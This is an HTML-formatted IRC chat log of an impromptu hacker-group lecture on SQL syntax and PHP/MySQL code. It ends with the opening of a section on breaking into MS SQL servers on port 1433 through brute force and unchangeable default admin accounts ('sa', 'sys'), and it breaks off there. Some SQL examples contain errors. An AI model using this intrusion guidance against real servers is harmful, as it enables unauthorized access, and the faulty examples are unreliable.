@@ -1,0 +1,788 @@
+<HTML>
+<HEAD>
+   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+   <META NAME="GENERATOR" CONTENT="Mozilla/4.04 [en] (Win95; I) [Netscape]">
+   <TITLE>Sql Database Lecture</TITLE>
+</HEAD>
+<BODY>
+
+<HR SIZE=1 NOSHADE WIDTH="60%">
+<CENTER>Sql Databases Mini Lecture</CENTER>
+
+<CENTER>by</CENTER>
+
+<CENTER>d4JinX / AZTEK / Spiderman / Mikkkeee</CENTER>
+
+<CENTER><A HREF="http://blacksun.box.sk">http://blacksun.box.sk</A></CENTER>
+
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="80%"></CENTER>
+<B></B>
+
+<P><B>*Note: This lecture was held&nbsp; impromptu so we didn't have a
+chance to cover many more important areas of sql databases.</B><B></B>
+
+<P>*** Mikkkeee sets mode: +m
+<BR>&lt;Mikkkeee> okay we got something set
+<BR>&lt;Mikkkeee> its going to be an sql lecture
+<BR>-xenitanus- thanks :)
+<BR>&lt;Mikkkeee> pl/sql then php/sql then cracking sql
+<BR>&lt;Mikkkeee> then we can kill reptile after we are done
+<BR>*** Mikkkeee sets mode: -m
+<BR>&lt;_ciR_> lol
+<BR>&lt;MASTURB4TION> sounds ok
+<BR>&lt;N0_Nick> hm
+<BR>&lt;N0_Nick> okay
+<BR>&lt;UnHaFox> lol nick, now its 4.30?&nbsp;&nbsp; and before 10.00?=))))))))))))
+you are are from california, aren t you?
+<BR>&lt;N0_Nick> we will survive
+<BR>&lt;UnHaFox> =)
+<BR>&lt;UnHaFox> ok mikkee
+<BR>&lt;MASTURB4TION> espescially the end
+<BR>&lt;_ciR_> im 4 killing reptile
+<BR>&lt;N0_Nick> n0 man
+<BR>&lt;AZTEK> d4JinX: is starting
+<BR>*** AZTEK sets mode: +m
+<BR>&lt;d4JinX> lol
+<BR>&lt;AZTEK> take it away d4JinX
+<BR>&lt;d4JinX> Am I?
+<BR>*** Mikkkeee sets mode: +o d4JinX
+<BR>*** ChanServ sets mode: -o d4JinX
+<BR>&lt;AZTEK> well you want to start with history
+<BR>&lt;d4JinX> I think sql should run first..
+<BR>*** SySt3mShk has joined #bsrf
+<BR>&lt;AZTEK> ok
+<BR>&lt;Mikkkeee> ----------------sql lecture------------------------
+<BR>&lt;d4JinX> Okay, SQL stands for Structured query language
+<BR>&lt;AZTEK> SQL originated from IBM's research labs in the early 1070's
+<BR>&lt;d4JinX> k..
+<BR>&lt;AZTEK> SQL is the post cursor to SEQUEL
+<BR>&lt;AZTEK> Structured English QUEry Language
+<BR>*** d4JinX is now known as d4J1nX
+<BR>*** Lone[Star] has quit IRC (Quit: see ya pplz l8r)
+<BR>&lt;AZTEK> sql is strictly a language to access relational databases
+<BR>*** _ciR_ has quit IRC (Quit: )
+<BR>&lt;AZTEK> such as oracle or paradox
+<BR>&lt;AZTEK> the latest ansi is recomendation sql-92
+<BR>&lt;AZTEK> and thats my history now for d4J1nX
+<BR>&lt;AZTEK> brb
+<BR>&lt;d4J1nX> As Aztek said SQL is a language used to access databases
+<BR>&lt;d4J1nX> It has very simple syntax
+<BR>&lt;d4J1nX> And is very easy to pick up
+<BR>*** SySt3mShk has quit IRC (Ping timeout: 181 seconds)
+<BR>&lt;d4J1nX> Languages such as ASP and PHP use SQL statements
+<BR>&lt;d4J1nX> Say we had a database called people
+<BR>&lt;d4J1nX> I hope everyone knows what a database is ;-)
+<BR>&lt;d4J1nX> Within that database would be a number of tables
+<BR>&lt;d4J1nX> These tables hold the data in the form of fields with their
+corresponding types
+<BR>&lt;AZTEK> ok back
+<BR>&lt;d4J1nX> eg people table
+<BR>&lt;d4J1nX> This could be made up of
+<BR>&lt;d4J1nX> wb Az
+<BR>&lt;AZTEK> thx
+<BR>&lt;d4J1nX> SURNAME VARCHAR2(50)
+<BR>&lt;d4J1nX> FORENAME VARCHAR2(50)
+<BR>&lt;d4J1nX> TELEPHONE NUMBER
+<BR>&lt;d4J1nX> VARCHAR and number are the types
+<BR>&lt;AZTEK> PHONENUM INTEGER(7)
+<BR>*** StartX has joined #bsrf
+<BR>&lt;d4J1nX> There would also be an ID field
+<BR>&lt;d4J1nX> Used for indexing and joining tables
+<BR>&lt;d4J1nX> It has to be unique
+<BR>&lt;d4J1nX> And it cant be null when a new record is added to the table
+<BR>*** SySt3mShk has joined #bsrf
+<BR>&lt;d4J1nX> PEOPLE_ID NUMBER
+<BR>&lt;d4J1nX> So we have a table called people with the fields already
+stated
+<BR>&lt;d4J1nX> Say we have a web front end
+<BR>&lt;d4J1nX> And we want to display all the people within the table
+<BR>&lt;d4J1nX> We would use a statement like
+<BR>&lt;AZTEK> SELECT * FROM People
+<BR>&lt;d4J1nX> SELECT * from people
+<BR>&lt;d4J1nX> * being all the fields
+<BR>&lt;d4J1nX> We could pull back one field or two
+<BR>&lt;d4J1nX> SELECT surname,forename FROM table
+<BR>&lt;d4J1nX> If its a big table
+<BR>&lt;d4J1nX> SELECT *
+<BR>&lt;d4J1nX> Can take a long time
+<BR>*** WishGenie has joined #bsrf
+<BR>&lt;d4J1nX> So sometimes its better to pull back only the fields required
+<BR>&lt;d4J1nX> If your lazy as well, SELECT * lol
+<BR>*** Drager has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;d4J1nX> Once we issue this statement a temporary table is setup
+<BR>&lt;AZTEK> a view
+<BR>&lt;d4J1nX> Which has the relevant fields and the relevant values
+<BR>&lt;d4J1nX> Yes, you can have views too
+<BR>*** CodE4 has joined #bsrf
+<BR>&lt;AZTEK> i was just wondering when you were goign to start them
+<BR>*** idiocy|idle has quit IRC (Read error: 104 (Connection reset by
+peer))
+<BR>&lt;d4J1nX> If we want to add to the people tablAka's: Brian-17-, Mr_Innocent
+<BR>&lt;d4J1nX> Name: Brian
+<BR>&lt;d4J1nX> Age: 17
+<BR>&lt;d4J1nX> Department: Warez
+<BR>&lt;d4J1nX> Rank: Head
+<BR>&lt;d4J1nX> Skillz: nuking, kloning, email bombing, spoofing, flooding,
+viral attacks, networking, troubleshooting, finding illegal software
+<BR>&lt;d4J1nX> WeFuck
+<BR>&lt;d4J1nX> My buffer
+<BR>&lt;AZTEK> its what i would have done first
+<BR>&lt;d4J1nX> kay
+<BR>&lt;d4J1nX> You go for it
+<BR>&lt;AZTEK> lol from that site form the message board
+<BR>&lt;d4J1nX> phone
+<BR>&lt;d4J1nX> Yep
+<BR>&lt;AZTEK> no no your doing fine
+<BR>&lt;d4J1nX> 2 secs phone
+<BR>*** [PhaLanX] has quit IRC (Ping timeout: 180 seconds)
+<BR>*** ken has joined #bsrf
+<BR>*** CodE4 has left #bsrf
+<BR>*** d4J1nX has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;Mikkkeee> okay the lecture will presume in a few min
+<BR>&lt;AZTEK> i am sorta not here and here
+<BR>&lt;AZTEK> so i will be in and out
+<BR>&lt;Mikkkeee> same here iam going to wrap some stuff for the cracking
+part
+<BR>*** freespeachlamer has joined #bsrf
+<BR>*** AirriK has joined #bsrf
+<BR>*** d4J1nX has joined #bsrf
+<BR>*** [PhaLanX] has joined #bsrf
+<BR>*** Mikkkeee sets mode: +v d4J1nX
+<BR>&lt;Mikkkeee> wb
+<BR>&lt;d4J1nX> Thx
+<BR>&lt;d4J1nX> Side lecture - See when ya have a cable modem, dont let
+your cellphone anywhere near it, especially when it rings
+<BR>*** AirriK is now known as _AirriK-
+<BR>&lt;AZTEK> lol
+<BR>&lt;d4J1nX> Keep getting caught with that
+<BR>&lt;d4J1nX> Had to reboot
+<BR>&lt;d4J1nX> So, where were we?
+<BR>&lt;bluehaze> was there any lecture?
+<BR>*** _AirriK- has quit IRC (Quit: Leaving)
+<BR>&lt;Mikkkeee> yah were doing an sql lecture instead
+<BR>&lt;bluehaze> oh
+<BR>&lt;Mikkkeee> &lt;d4J1nX> If we want to add to the people tablAka's:
+Brian-17-, Mr_Innocent
+<BR>&lt;Mikkkeee> &lt;d4J1nX> Name: Brian
+<BR>&lt;Mikkkeee> &lt;d4J1nX> Age: 17
+<BR>&lt;Mikkkeee> &lt;d4J1nX> Department: Warez
+<BR>&lt;Mikkkeee> &lt;d4J1nX> Rank: Head
+<BR>&lt;Mikkkeee> &lt;d4J1nX> Skillz: nuking, kloning, email bombing, spoofing,
+flooding, viral attacks, networking, troubleshooting, finding illegal software
+<BR>&lt;Mikkkeee> we were up to there
+<BR>&lt;bluehaze> who's giving it?
+<BR>&lt;bluehaze> oh ok
+<BR>&lt;Mikkkeee> aztek/d4j1nx/and I
+<BR>*** lostmode has joined #bsrf
+<BR>&lt;d4J1nX> Kay
+<BR>*** xenitanus has quit IRC (Quit:)
+<BR>&lt;d4J1nX> So basically we pull back a temporary table from that statement
+<BR>&lt;d4J1nX> We can also have conditional syntax
+<BR>&lt;d4J1nX> Such as
+<BR>*** freespeachlamer has left #bsrf
+<BR>&lt;d4J1nX> SELECT surname FROM people WHERE surname LIKE '%on'
+<BR>&lt;d4J1nX> Will pull back all the records where the surname has on
+at the end
+<BR>&lt;d4J1nX> Or
+<BR>&lt;d4J1nX> SELECT phone_number FROM people WHERE phone_number>809090
+<BR>&lt;d4J1nX> Self explanatry I hope
+<BR>&lt;d4J1nX> If we want to add to a table
+<BR>&lt;d4J1nX> Then we use an INSERT statement
+<BR>*** Litte has joined #bsrf
+<BR>*** cupelmen has joined #bsrf
+<BR>&lt;d4J1nX> INSERT into people(surname,forname,phone_number) VALUES
+('woods','jim',0202020)
+<BR>&lt;d4J1nX> The ID will be created automatically by means of a trigger
+- will get to it later
+<BR>&lt;d4J1nX> If we wanted to update the table then we would use the
+UPDATE statement..
+<BR>&lt;d4J1nX> UPDATE people SET surname='newsurname';
+<BR>&lt;d4J1nX> deleting would require knowing the id, more practical,
+although not necessary
+<BR>&lt;d4J1nX> DELETE from people where people_id=349
+<BR>*** StartX has quit IRC (Quit: )
+<BR>&lt;d4J1nX> The three basic db maintenance statements
+<BR>&lt;d4J1nX> All pretty simple syntax, as I mentioned before
+<BR>*** Devil_Panther has joined #BSRF
+<BR>*** zwanderer has joined #bsrf
+<BR>*** Shadow_Stalker has joined #bsrf
+<BR>&lt;d4J1nX> So we know how to add to a table in a database, delete
+from a table and update a record in a table
+<BR>*** reptile has joined #bsrf
+<BR>*** Litte has quit IRC (Quit: Clone for reptile w00t w00t)
+<BR>*** _ciR_ has joined #bsrf
+<BR>&lt;AZTEK> yep it is simple
+<BR>&lt;d4J1nX> As I mentioned earlier..
+<BR>&lt;d4J1nX> A trigger is used to created the id automatically
+<BR>*** _ciR_ is now known as __ciR_-
+<BR>&lt;d4J1nX> A trigger is a small script, if you like that will add
+the id to the id field on an insert into the table
+<BR>*** D12_BoyZ has joined #bsrf
+<BR>&lt;d4J1nX> This ID number is taken from a number sequence in the database
+<BR>&lt;d4J1nX> The sequences are created manually
+<BR>*** ewren has joined #bsrf
+<BR>*** D12_BoyZ has left #bsrf
+<BR>&lt;d4J1nX> Each table that is normalized and has an ID field will
+have a different sequence
+<BR>&lt;d4J1nX> Now..
+<BR>&lt;d4J1nX> Say we have another field in our people table
+<BR>*** paranoid has joined #bsrf
+<BR>&lt;d4J1nX> Called contact_name
+<BR>&lt;d4J1nX> And contact_address
+<BR>*** MrBS480 has joined #bsrf
+<BR>*** cupelmen has joined #bsrF
+<BR>&lt;d4J1nX> Now in order to normalise a db we would remove these two
+"repeating" fields and replace them with one
+<BR>&lt;d4J1nX> Contact_ID
+<BR>&lt;d4J1nX> And a separate table would be created called contacts
+<BR>&lt;d4J1nX> This table would have the fields.
+<BR>&lt;d4J1nX> Contact_id
+<BR>&lt;d4J1nX> Contact_name
+<BR>*** Mikkkeee sets mode: +v Devil_Panther
+<BR>&lt;d4J1nX> Contact_address
+<BR>&lt;d4J1nX> brb door
+<BR>*** paranoid has left #bsrf
+<BR>&lt;Mikkkeee> okay seems like reptile showed up, so were going to finish
+this lecture and then do the vb coding
+<BR>*** MrBS480 has quit IRC (Quit: )
+<BR>*** ewren has quit IRC (Quit: )
+<BR>*** flipu has joined #bsrf
+<BR>&lt;d4J1nX> back
+<BR>&lt;d4J1nX> Kay, I hope this is making some sense here, didnt really
+have time to prepare
+<BR>&lt;d4J1nX> Right so we now have two tables
+<BR>*** lostmode has quit IRC (Quit: )
+<BR>&lt;d4J1nX> Contact table
+<BR>&lt;d4J1nX> And people table
+<BR>&lt;d4J1nX> Say we wanted all contact names for all the people whose
+first name was john
+<BR>&lt;d4J1nX> We would have to join our tables in the query statement
+<BR>*** flipu has quit IRC (Not enough time connected)
+<BR>*** torpor has joined #bsrf
+<BR>*** __ciR_- has left #bsrf
+<BR>&lt;d4J1nX> SELECT contact_name FROM people p,contact c WHERE p.contact_id=c.contact_id
+AND forename = 'John'
+<BR>&lt;d4J1nX> Notice the c and p used for an alias and to remove ambiguity
+<BR>*** WishGenie has quit IRC (Quit: i gotta reboot)
+<BR>*** cupelmen has quit IRC (Quit: time to sleep...)
+<BR>&lt;d4J1nX> That statement will pull back the contact names for all
+the people called John
+<BR>&lt;d4J1nX> On an off note..
+<BR>&lt;d4J1nX> Say we had a drop down/combo box on our webpage
+<BR>&lt;d4J1nX> And we wanted the full details of a particular person
+<BR>*** makzee has quit IRC (Ping timeout: 180 seconds)
+<BR>*** SpiderMan has joined #bsrf
+<BR>*** ChanServ sets mode: +o SpiderMan
+<BR>&lt;d4J1nX> In the drop box we would have the details "John Woods"
+or "Chris Simms"
+<BR>*** bluehaze has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;d4J1nX> But the actual value would be the corresponding id in the
+table
+<BR>&lt;Mikkkeee> hail spider
+<BR>&lt;SpiderMan> hey
+<BR>&lt;AZTEK> Spidey
+<BR>*** ken has quit IRC (Quit: )
+<BR>&lt;AZTEK> all hail SpiderMan
+<BR>&lt;SpiderMan> hey AZTEK
+<BR>*** Capt_InsaneO has joined #bsrf
+<BR>&lt;d4J1nX> Depending on the langauge being used we loop through each
+record brought back from the query and have a formselectOption for each
+<BR>*** Mezzano has quit IRC (Read error: 113 (No route to host))
+<BR>&lt;d4J1nX> SELECT people_id, forename FROM people;
+<BR>&lt;d4J1nX> The forename would be in the dropdown
+<BR>*** torpor has left #bsrf
+<BR>&lt;d4J1nX> But behind the scenes the actual value for that selection
+is the id
+<BR>*** Capt_InsaneO has left #bsrf
+<BR>*** mezzano has joined #bsrf
+<BR>*** acid519 has joined #bsrf
+<BR>&lt;Devil_Panther> oh... hi spidy
+<BR>&lt;d4J1nX> This is moving on to front end languages though and since
+php seems to be very popular at the moment, Aztek will take it form here
+<BR>&lt;d4J1nX> Hey Spider :-)
+<BR>&lt;SpiderMan> hi
+<BR>&lt;SpiderMan> sorry to disturb
+<BR>&lt;d4J1nX> np
+<BR>&lt;AZTEK> ok i guess its php time
+<BR>&lt;AZTEK> and we are going to php and not perl
+<BR>&lt;SpiderMan> so soon?
+<BR>&lt;AZTEK> lets hit it spidy\
+<BR>&lt;AZTEK> yea
+<BR>&lt;AZTEK> ok
+<BR>&lt;SpiderMan> nothing more of SQL?
+<BR>&lt;SpiderMan> WHERE clause
+<BR>&lt;Mikkkeee> php now
+<BR>&lt;SpiderMan> db normilization
+<BR>&lt;SpiderMan> ok
+<BR>&lt;Devil_Panther> AZTEK,,, i guess you preffer php on perl... huh?!
+<BR>&lt;AZTEK> we did the WHERE
+<BR>&lt;AZTEK> yea
+<BR>&lt;d4J1nX> Thats already been done Spider
+<BR>&lt;SpiderMan> ok
+<BR>&lt;d4J1nX> Plus normalisation - although not alot
+<BR>&lt;SpiderMan> ok then I guess it is php time :)
+<BR>&lt;AZTEK> mysql is the prefered datbase engine of choice by us phpers
+<BR>&lt;SpiderMan> because it's small, fast, and cheap
+<BR>&lt;AZTEK> what make us choose mysql over any other
+<BR>&lt;d4J1nX> You want me to go into normalisation more first Aztek?
+<BR>&lt;AZTEK> exactly
+<BR>&lt;AZTEK> cant beat free
+<BR>&lt;SpiderMan> also it's avaliable on many platforms
+<BR>&lt;Devil_Panther> ok ok...
+<BR>&lt;Devil_Panther> LECTURE PLS
+<BR>&lt;AZTEK> yea any platform apache and php run mysql does
+<BR>&lt;Devil_Panther> lol
+<BR>*** BaGeL has joined #bsrf
+<BR>&lt;AZTEK> ok
+<BR>&lt;AZTEK> mysql_connect();
+<BR>&lt;AZTEK> you have to connect to the mysql host
+<BR>&lt;d4J1nX> Can php use access databases Az?
+<BR>&lt;AZTEK> usually localhost
+<BR>&lt;AZTEK> d4J1nX: yes
+<BR>&lt;AZTEK> actually i am waiting for spidy to give me the syntax since
+i don't have my manual open
+<BR>&lt;SpiderMan> for mysql_connect()?
+<BR>&lt;SpiderMan> it's localhost, username, password
+<BR>&lt;AZTEK> yea
+<BR>&lt;SpiderMan> in strings
+<BR>&lt;AZTEK> yea but port
+<BR>&lt;AZTEK> and stuff
+<BR>&lt;SpiderMan> if no port is given it uses the default
+<BR>&lt;AZTEK> int mysql_connect ([string hostname [:port] [:/path/to/socket]
+[, string username [, string password]]])
+<BR>&lt;SpiderMan> you don't have to provide the port unless it's different
+then the standard
+<BR>&lt;AZTEK> yea
+<BR>&lt;AZTEK> i was wanting the full atribs :)
+<BR>&lt;SpiderMan> ah, I'll open my docs
+<BR>&lt;AZTEK> ok mysql_connect() returns a database handle
+<BR>&lt;AZTEK> that we will use later for other things
+<BR>&lt;SpiderMan> you should always check for a valid handle
+<BR>&lt;AZTEK> we use mysql_query();
+<BR>&lt;AZTEK> te send a query which d4J1nX when over the standard querys
+earlier
+<BR>&lt;SpiderMan> $con= mysql_connect("localhost", "jared", "pass"); if(!$con)
+{die("can't connect!");}
+<BR>*** Shiva_Shanti has joined #bsrf
+<BR>&lt;AZTEK> mysql_query("SELECT * FROM people");
+<BR>&lt;SpiderMan> int mysql_query (string query [, int link_identifier])
+<BR>*** d4J1nX has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;AZTEK> $result = mysql_query("SELECT * FROM people");
+<BR>&lt;AZTEK> thats will return what mysql said for the query
+<BR>&lt;SpiderMan> then you can use functions such as mysql_fetch_array()
+to get the results
+<BR>&lt;AZTEK> yea
+<BR>&lt;AZTEK> umm thats the reson php is popular for database use its
+really easy :)
+<BR>*** acid519 has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;AZTEK> use mysql_drop_db("database name"); to delete a database
+<BR>&lt;AZTEK> use mysql_create_db("database name"); to create a databse
+<BR>&lt;AZTEK> anything else spidy
+<BR>&lt;AZTEK> like i said its easy
+<BR>&lt;SpiderMan> int mysql_create_db (string database name [, int link_identifier])
+<BR>&lt;SpiderMan> let's give an example
+<BR>&lt;AZTEK> ok
+<BR>&lt;AZTEK> from the start
+<BR>&lt;SpiderMan> how about something to pull news out of a db
+<BR>*** d4J1nX has joined #bsrf
+<BR>&lt;AZTEK> ok
+<BR>&lt;SpiderMan> let's say a database is set up with an id field and
+a news field
+<BR>&lt;SpiderMan> to get the news out we could do this
+<BR>&lt;SpiderMan> if (!mysql_connect("host", "user", "pass")) {die("error!");}
+<BR>*** TCL has joined #bsrf
+<BR>*** ChanServ sets mode: +v TCL
+<BR>&lt;SpiderMan> mysql_select_db("db");
+<BR>&lt;AZTEK> |ID|NEWS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|
+<BR>&lt;AZTEK> --------------------------
+<BR>&lt;AZTEK> |1 |.....................|
+<BR>&lt;AZTEK> |2 |.....................|
+<BR>&lt;AZTEK> |3 |.....................|
+<BR>&lt;AZTEK> |4 |.....................|
+<BR>&lt;AZTEK> |5 |.....................|
+<BR>&lt;SpiderMan> that's what the db table would look like
+<BR>&lt;SpiderMan> $result= mysql_query("SELECT * FROM news ORDER BY id
+DESC);
+<BR>&lt;SpiderMan> we use that to select the news and id out
+<BR>&lt;SpiderMan> then using a while loop fetch all the data
+<BR>*** Shiva_Shanti has quit IRC (Quit: eat, bbl)
+<BR>&lt;SpiderMan> while($row= mysql_fetch_array($result)) {
+<BR>&lt;SpiderMan> $news= $row["NEWS"];
+<BR>&lt;SpiderMan> $id= $row["ID"];
+<BR>*** divinator has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;SpiderMan> echo "id= $id&lt;br>";
+<BR>*** N0_Nick has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;SpiderMan> echo "news= $news&lt;br>";
+<BR>&lt;SpiderMan> }
+<BR>&lt;SpiderMan> and after that we close the connection to the database
+<BR>&lt;AZTEK> ok i tought spidy was just pulling this out of one of his
+scripts
+<BR>&lt;AZTEK> never mind
+<BR>&lt;SpiderMan> heh nope
+<BR>&lt;SpiderMan> just wrote it up right now
+<BR>&lt;AZTEK> ok
+<BR>&lt;AZTEK> using my little impromtu database
+<BR>&lt;SpiderMan> heh yup
+<BR>&lt;SpiderMan> question time?
+<BR>&lt;AZTEK> .mode #bsrf -m
+<BR>*** AZTEK sets mode: -m
+<BR>&lt;freakOVER[away]> whew
+<BR>*** N0_Nick has joined #bsrf
+<BR>&lt;UnHaFox> =)
+<BR>&lt;freakOVER[away]> i felt so
+<BR>&lt;freakOVER[away]> muzzled
+<BR>&lt;SpiderMan> heh
+<BR>*** acid519 has joined #bsrf
+<BR>&lt;UnHaFox> ah got it one the log file;)
+<BR>&lt;AZTEK> damn laptop
+<BR>&lt;mezzano> we can talk again ;)
+<BR>&lt;AZTEK> well its not over
+<BR>&lt;d4J1nX> Explain each line of code Spider
+<BR>&lt;AZTEK> d4J1nX
+<BR>&lt;AZTEK> is about to do perl
+<BR>&lt;UnHaFox> not over?
+<BR>&lt;N0_Nick> hey i got disconnected
+<BR>&lt;SpiderMan> ok
+<BR>&lt;N0_Nick> man
+<BR>&lt;freakOVER[away]> oo
+<BR>&lt;SpiderMan> wait I want to give some tips before we go to perl
+<BR>&lt;freakOVER[away]> perl
+<BR>*** AZTEK sets mode: +m
+<BR>&lt;SpiderMan> ok so first we connect to the database using mysql_connect()
+<BR>*** acid519 is now known as _acid519-
+<BR>*** pixel_chomp has joined #bsrf
+<BR>&lt;SpiderMan> we test to make sure we could connect in the if clause
+<BR>&lt;AZTEK> if (!mysql_connect("host", "user", "pass")) {die("error!");}
+<BR>&lt;SpiderMan> if we can't connect we exit the script with the error
+message
+<BR>*** _ciR_ has joined #bsrf
+<BR>&lt;SpiderMan> in a real script you would give a better error
+<BR>&lt;AZTEK> yea like
+<BR>&lt;AZTEK> "You fucked it up"
+<BR>&lt;AZTEK> lol
+<BR>&lt;AZTEK> $result= mysql_query("SELECT * FROM news ORDER BY id DESC);
+<BR>&lt;SpiderMan> in fact if you want to get the error mysql gives you,
+you can use the function mysql_error()
+<BR>&lt;AZTEK> now we query the database asking for all info in the databse
+news and we want it ordered by the id feild decending
+<BR>&lt;AZTEK> you forgot your "
+<BR>*** SySt3mShk has left #bsrf
+<BR>&lt;AZTEK> $result= mysql_query("SELECT * FROM news ORDER BY id DESC");
+<BR>*** SySt3mShk has joined #bsrf
+<BR>&lt;SpiderMan> heh whoops
+<BR>&lt;AZTEK> &lt;SpiderMan> while($row= mysql_fetch_array($result)) {
+<BR>&lt;AZTEK> &lt;SpiderMan> $news= $row["NEWS"];
+<BR>&lt;AZTEK> &lt;SpiderMan> $id= $row["ID"];
+<BR>&lt;AZTEK> *** divinator (Oper@box.sk) Quit (Ping timeout: 180 seconds)
+<BR>&lt;AZTEK> &lt;SpiderMan> echo "id= $id&lt;br>";
+<BR>&lt;AZTEK> *** N0_Nick (hgfhf@202.179.171.BOX-24341) Quit (Ping timeout:
+180 seconds)
+<BR>&lt;AZTEK> &lt;SpiderMan> echo "news= $news&lt;br>";
+<BR>&lt;AZTEK> &lt;SpiderMan> }
+<BR>&lt;SpiderMan> that says while there are rows to fetch, get them
+<BR>&lt;AZTEK> here we are looping
+<BR>&lt;AZTEK> yea
+<BR>-d4J1nX- I have to go here, going out, I will speak soon
+<BR>*** UnHaFox has left #bsrf
+<BR>&lt;AZTEK> $row becomes a hask array with the column names as identifiers
+<BR>-d4J1nX- say bye for meeee
+<BR>&lt;SpiderMan> hash array*
+<BR>&lt;AZTEK> yea hash
+<BR>*** d4J1nX has quit IRC (Quit: )
+<BR>&lt;AZTEK> and echo is self explainatory
+<BR>&lt;SpiderMan> yeah
+<BR>&lt;SpiderMan> just print it out
+<BR>*** UnHaFox has joined #bsrf
+<BR>&lt;AZTEK> thats about it
+<BR>&lt;SpiderMan> when the script finishes the connection to the db will
+close
+<BR>&lt;SpiderMan> also just a tip
+<BR>&lt;AZTEK> now
+<BR>&lt;SpiderMan> if you are using larger scripts
+<BR>&lt;SpiderMan> use mysql_pconnect()
+<BR>*** AZTEK sets mode: -m
+<BR>&lt;SpiderMan> it will save memory
+<BR>&lt;AZTEK> for persestant connection
+<BR>&lt;UnHaFox> ah=)
+<BR>&lt;AZTEK> so they wont keep connecting with each user
+<BR>*** divinator has joined #bsrf
+<BR>&lt;reptile> ;)
+<BR>&lt;UnHaFox> ?
+<BR>&lt;SpiderMan> so questions?
+<BR>&lt;freakOVER[away]> lol rep
+<BR>&lt;_ciR_> oh
+<BR>&lt;_ciR_> lets kill reptile
+<BR>&lt;_ciR_> lol
+<BR>&lt;divinator> yo
+<BR>&lt;AZTEK> now i guess Mikkkeee will cover hacking sql
+<BR>&lt;BaGeL> sup div
+<BR>&lt;_ciR_> he didnt show up
+<BR>&lt;UnHaFox> yes i have one, but this one doent concern this subject,
+so can i ask it?
+<BR>&lt;Mikkkeee> you guys are done?
+<BR>&lt;AZTEK> yea
+<BR>&lt;reptile> ;()
+<BR>&lt;SpiderMan> UnHaFox: uh...depends on what it is
+<BR>&lt;UnHaFox> can i ask?
+<BR>&lt;AZTEK> well d4jinx isn't here for perl :(
+<BR>&lt;Mikkkeee> well reptile said he was late but shit lets do my section
+and then do one or two of his lectures
+<BR>&lt;UnHaFox> its not a stupid one
+<BR>&lt;reptile> juz ask UnHaFox
+<BR>&lt;pixel_chomp> did anyone log this ?
+<BR>&lt;Mikkkeee> i got the log
+<BR>&lt;freakOVER[away]> i did
+<BR>&lt;freakOVER[away]> i got the logs
+<BR>&lt;freakOVER[away]> i'll send'em to u
+<BR>&lt;freakOVER[away]> :P
+<BR>&lt;_ciR_> k
+<BR>&lt;AZTEK> this will be one huge ass log
+<BR>&lt;Mikkkeee> okay i'll cut up the log
+<BR>&lt;AZTEK> and i will probably end up converting it
+<BR>&lt;Mikkkeee> shit 3 lectures
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;SpiderMan> hahah
+<BR>&lt;freakOVER[away]> yea
+<BR>&lt;SpiderMan> there is so much more to cover
+<BR>&lt;freakOVER[away]> we'll have to divide it
+<BR>&lt;Mikkkeee> i'll spend the weekend doing that
+<BR>&lt;freakOVER[away]> :P
+<BR>*** AZTEK sets mode: +m
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;AZTEK> yea spidys right
+<BR>&lt;SpiderMan> UnHaFox never got to ask his question
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;AZTEK> we barely scratched the surface
+<BR>&lt;SpiderMan> ask quickly
+<BR>&lt;UnHaFox> ok, how can i change the version reply of mirc? successfully
+changed one of the version replies, but not the first one..... (where it
+say micr 5.81) or soemthing like that?
+<BR>&lt;UnHaFox> thx
+<BR>&lt;SpiderMan> heh with my I just hex it
+<BR>&lt;reptile> UnHaFox:wait for the mirc scriptin lecture
+<BR>&lt;reptile> :)
+<BR>&lt;mezzano> off topic! ;)
+<BR>&lt;Mikkkeee> what version reply? read the irc war tutorial
+<BR>&lt;UnHaFox> ok
+<BR>&lt;UnHaFox> sorry
+<BR>&lt;Mikkkeee> i covered that section
+<BR>&lt;Mikkkeee> okay let me do my section then reptile can do his lecture
+<BR>&lt;reptile> *maybe* ill cover hexing the mirc client
+<BR>&lt;Mikkkeee> which are you doing reptile?
+<BR>&lt;SpiderMan> heh
+<BR>&lt;Mikkkeee> heh
+<BR>&lt;SpiderMan> guys for more info on php+sql go to www.php.net
+<BR>&lt;SpiderMan> and look at their docs
+<BR>&lt;UnHaFox> ok only use a hex editor, and find this entry, ok thx
+guys
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;reptile> Mikkkeee:vb,vb advanced,vb super advanced,api and shit,mirc
+scriptin,*maybe* haxoring the mirc ckuebt
+<BR>&lt;SpiderMan> UnHaFox: for an example version me
+<BR>&lt;Mikkkeee> okay lets do the cracking sql section
+<BR>&lt;freakOVER[away]> lol
+<BR>&lt;reptile> *client
+<BR>*** Mikkkeee sets mode: +m
+<BR>*** Mikkkeee sets mode: +v reptile
+<BR>&lt;Mikkkeee> okay iam going to talk a bit about breaking into ms sql
+servers for versions 6.5 and 7.0
+<BR>&lt;reptile> tankies
+<BR>&lt;Mikkkeee> via tcp/ip on port 1433.
+<BR>&lt;Mikkkeee> many ms sql servers run on port 1433,
+<BR>&lt;Mikkkeee>&nbsp; if they are not configured to run on another tcp
+port. Many scanners can
+<BR>&lt;Mikkkeee> tell you the running sevice on the open port
+<BR>&lt;Mikkkeee> and what service is running
+<BR>&lt;Mikkkeee> ie- Retina from eEye and whatever you use.
+<BR>&lt;Mikkkeee> so now
+<BR>&lt;Mikkkeee> lets begin with the brute force attack
+<BR>&lt;Mikkkeee> - many or most databases have some default and well known
+passwords.
+<BR>&lt;Mikkkeee>&nbsp; usually the system admin accounts can not be changed
+in many of the commercial databases,
+<BR>&lt;Mikkkeee> so thats a good thing for us. "sys" for ORACLE and "sa"
+for SQL server cannot be changed.
+<BR>*** Azido has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;Mikkkeee> There is no password lockout that is avaiable for sql
